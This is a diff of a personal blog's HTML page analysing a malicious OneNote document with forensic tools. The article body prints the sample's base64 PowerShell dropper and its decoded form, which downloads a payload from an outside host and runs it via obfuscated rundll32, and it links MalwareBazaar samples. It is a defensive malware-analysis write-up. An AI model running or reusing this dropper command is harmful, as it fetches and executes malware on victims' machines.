@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>Exploring OneNote Forensic tools | Journal of Connar</title>
 <meta name="keywords" content="OneNote, Maldocs, .one">
 <meta name="description" content="Intro
@@ -23,16 +23,16 @@ Opening the sample in an online .one viewer, we can observe the following:
 
 We can see that a .cmd script is placed at the &lsquo;Open&rsquo; button which is what the document asks the user to double click. It obviously tries to convince the user into running the .cmd script. Let&rsquo;s use the OneNoteAnalyzer.exe tool to extract this script along with other relevant information attached to the document.">
 <meta name="author" content="connar">
-<link rel="canonical" href="http://localhost:1313/posts/onenote/">
+<link rel="canonical" href="https://connar.github.io/posts/onenote/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.1665878c578779cd11d4dc626b2c0e032a8b9c1dcf7d37f819200b4bc208b6a7.css" integrity="sha256-FmWHjFeHec0R1NxiaywOAyqLnB3PfTf4GSALS8IItqc=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<link rel="icon" href="https://connar.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://connar.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://connar.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://connar.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://connar.github.io/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/onenote/">
+<link rel="alternate" hreflang="en" href="https://connar.github.io/posts/onenote/">
 <noscript>
     <style>
         #theme-toggle,
@@ -69,7 +69,99 @@ We can see that a .cmd script is placed at the &lsquo;Open&rsquo; button which i
         }
 
     </style>
-</noscript>
+</noscript><meta property="og:title" content="Exploring OneNote Forensic tools" />
+<meta property="og:description" content="Intro
+In this post, I will be writing my notes regarding some OneNote forensic tools that I got my hands on, but also the analysis of a sample I got from MalwareBazar to practise. The tools are:
+
+OneNoteAnalyzer.exe
+pyonenote.py
+
+The sample I practised on is the following:
+
+https://bazaar.abuse.ch/download/9019a31723e8dde778639cf5c1eb599bf250d7b6a3a92ba0e3c85b0043644d93/
+
+Viewing the sample
+Opening the sample in an online .one viewer, we can observe the following:
+
+
+We can see that a .cmd script is placed at the &lsquo;Open&rsquo; button which is what the document asks the user to double click. It obviously tries to convince the user into running the .cmd script. Let&rsquo;s use the OneNoteAnalyzer.exe tool to extract this script along with other relevant information attached to the document." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://connar.github.io/posts/onenote/" /><meta property="article:section" content="posts" />
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Exploring OneNote Forensic tools"/>
+<meta name="twitter:description" content="Intro
+In this post, I will be writing my notes regarding some OneNote forensic tools that I got my hands on, but also the analysis of a sample I got from MalwareBazar to practise. The tools are:
+
+OneNoteAnalyzer.exe
+pyonenote.py
+
+The sample I practised on is the following:
+
+https://bazaar.abuse.ch/download/9019a31723e8dde778639cf5c1eb599bf250d7b6a3a92ba0e3c85b0043644d93/
+
+Viewing the sample
+Opening the sample in an online .one viewer, we can observe the following:
+
+
+We can see that a .cmd script is placed at the &lsquo;Open&rsquo; button which is what the document asks the user to double click. It obviously tries to convince the user into running the .cmd script. Let&rsquo;s use the OneNoteAnalyzer.exe tool to extract this script along with other relevant information attached to the document."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://connar.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Exploring OneNote Forensic tools",
+      "item": "https://connar.github.io/posts/onenote/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Exploring OneNote Forensic tools",
+  "name": "Exploring OneNote Forensic tools",
+  "description": "Intro In this post, I will be writing my notes regarding some OneNote forensic tools that I got my hands on, but also the analysis of a sample I got from MalwareBazar to practise. The tools are:\nOneNoteAnalyzer.exe pyonenote.py The sample I practised on is the following:\nhttps://bazaar.abuse.ch/download/9019a31723e8dde778639cf5c1eb599bf250d7b6a3a92ba0e3c85b0043644d93/ Viewing the sample Opening the sample in an online .one viewer, we can observe the following:\nWe can see that a .cmd script is placed at the \u0026lsquo;Open\u0026rsquo; button which is what the document asks the user to double click. It obviously tries to convince the user into running the .cmd script. Let\u0026rsquo;s use the OneNoteAnalyzer.exe tool to extract this script along with other relevant information attached to the document.\n",
+  "keywords": [
+    "OneNote", "Maldocs", ".one"
+  ],
+  "articleBody": "Intro In this post, I will be writing my notes regarding some OneNote forensic tools that I got my hands on, but also the analysis of a sample I got from MalwareBazar to practise. The tools are:\nOneNoteAnalyzer.exe pyonenote.py The sample I practised on is the following:\nhttps://bazaar.abuse.ch/download/9019a31723e8dde778639cf5c1eb599bf250d7b6a3a92ba0e3c85b0043644d93/ Viewing the sample Opening the sample in an online .one viewer, we can observe the following:\nWe can see that a .cmd script is placed at the ‘Open’ button which is what the document asks the user to double click. It obviously tries to convince the user into running the .cmd script. Let’s use the OneNoteAnalyzer.exe tool to extract this script along with other relevant information attached to the document.\nOneNoteAnalyzer The use of this tool is simple. We only need to run the command OneNoteAnalyzer.exe --file [file] and get the output and extracted files:\nLet’s also use the pyonenote.py tool before proceeding to analyze the extracted files.\npyonenote We can get the pyonenote tool from the following repo:\nhttps://github.com/DissectMalware/pyOneNote Running the script finds the same information as the previous tool, just in a more verbose way:\nExtracted files - Open.cmd The file that is of most interest to us is the open.cmd file. Opening the file and viewing its contents, we see the following command:\npowershell.exe [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('DQpAZWNobyBvZmYNCg0KcG93ZXJzaGVsbCBJbnZva2UtV2ViUmVxdWVzdCAtVVJJIGh0dHBzOi8vYXJhZGNhcGl0YWwuY29tL01wRDhZay8wMC5naWYgLU91dEZpbGUgQzpccHJvZ3JhbWRhdGFcYmlnLmpwZw0KY2FsbCBydSUxbDMyIEM6XHByb2dyYW1kYXRhXGJpZy5qcGcsRGxsUmVnaXN0ZXJTZXJ2ZXINCg0KZXhpdA0K')) \u003e C:\\ProgramData\\in.cmd\u0026\u0026start /min C:\\ProgramData\\in.cmd ndl Decoding the base64 code, we end with the following command:\n@echo off powershell Invoke-WebRequest -URI https://aradcapital.com/MpD8Yk/00.gif -OutFile C:\\programdata\\big.jpg call ru%1l32 C:\\programdata\\big.jpg,DllRegisterServer exit So basically this cmd file decodes an encoded base64 string, saves it in another cmd file named in.cmd and then runs it with the ndl parameter which specifies that directory names are not to be logged.\nThis decoded base64 string as we saw by decoding it is another powershell command that downloads file named 00.gif and outputs it in another file named big.jpg. Then it proceeds to run it by using rundll32 in an obfuscated way. So we can safely assume this file is a .dll file.\nAll that’s left to do is analyze the DLL which can be found at:\nhttps://bazaar.abuse.ch/sample/5fb7f3fac0a9b9ab243ee642a0775500c524166ef075035c9510ccbab76ad633/ Extracted files - big.jpg Downloading the file and running the file command on it, we get the following info:\n┌──(connar㉿kali)-[~/blog/oneNote_samples] └─$ file big.jpg big.jpg: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows Initially opening the dll in Ghidra, it seems to be packed. For this purpose I uploaded it to any.run to observe its activity, and got the following feedback:\nSearching various strings, hashes and even bytes, I found out that there was a debate of whether this malware was of the family Matanbuchus but it ended up being related to PikaBot and was named Beep-Malware. I will try and analyze this dll in another post and share what I learned along the way:)\nThat is it for this post!\nReferences\n[1] Guided Hacking: Malicious OneNote Documents - Malware Analysis\r[2] pan-unit42: 2023-02-07-IOCs-for-probable-Matanbuchus-activity.txt\r",
+  "wordCount" : "479",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":[{
+    "@type": "Person",
+    "name": "connar"
+  }],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://connar.github.io/posts/onenote/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Journal of Connar",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://connar.github.io/favicon.ico"
+    }
+  }
+}
+</script>
 </head>
 
 <body class="" id="top">
@@ -87,7 +179,7 @@ We can see that a .cmd script is placed at the &lsquo;Open&rsquo; button which i
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="Journal of Connar (Alt + H)">Journal of Connar</a>
+            <a href="https://connar.github.io/" accesskey="h" title="Journal of Connar (Alt + H)">Journal of Connar</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -113,42 +205,42 @@ We can see that a .cmd script is placed at the &lsquo;Open&rsquo; button which i
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/categories/" title="Categories">
+                <a href="https://connar.github.io/categories/" title="Categories">
                     <span>Categories</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/tags/" title="Tags">
+                <a href="https://connar.github.io/tags/" title="Tags">
                     <span>Tags</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/mychallenges/" title="My Challenges">
+                <a href="https://connar.github.io/mychallenges/" title="My Challenges">
                     <span>My Challenges</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/posts/" title="Posts">
+                <a href="https://connar.github.io/posts/" title="Posts">
                     <span>Posts</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/projects/" title="Projects">
+                <a href="https://connar.github.io/projects/" title="Projects">
                     <span>Projects</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/training/" title="Training">
+                <a href="https://connar.github.io/training/" title="Training">
                     <span>Training</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/about/" title="About">
+                <a href="https://connar.github.io/about/" title="About">
                     <span>About</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
+                <a href="https://connar.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                     <span>Search</span>
                 </a>
             </li>
@@ -159,7 +251,7 @@ We can see that a .cmd script is placed at the &lsquo;Open&rsquo; button which i
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
+    <div class="breadcrumbs"><a href="https://connar.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://connar.github.io/posts/">Posts</a></div>
     <h1 class="post-title entry-hint-parent">
       Exploring OneNote Forensic tools
     </h1>
@@ -258,9 +350,9 @@ We can see that a .cmd script is placed at the &lsquo;Open&rsquo; button which i
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="http://localhost:1313/tags/onenote/">OneNote</a></li>
-      <li><a href="http://localhost:1313/tags/maldocs/">Maldocs</a></li>
-      <li><a href="http://localhost:1313/tags/.one/">.One</a></li>
+      <li><a href="https://connar.github.io/tags/onenote/">OneNote</a></li>
+      <li><a href="https://connar.github.io/tags/maldocs/">Maldocs</a></li>
+      <li><a href="https://connar.github.io/tags/.one/">.One</a></li>
     </ul>
 
   </footer>
@@ -268,7 +360,7 @@ We can see that a .cmd script is placed at the &lsquo;Open&rsquo; button which i
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="http://localhost:1313/">Journal of Connar</a></span> · 
+        <span>&copy; 2025 <a href="https://connar.github.io/">Journal of Connar</a></span> · 
 
     <span>
         Powered by
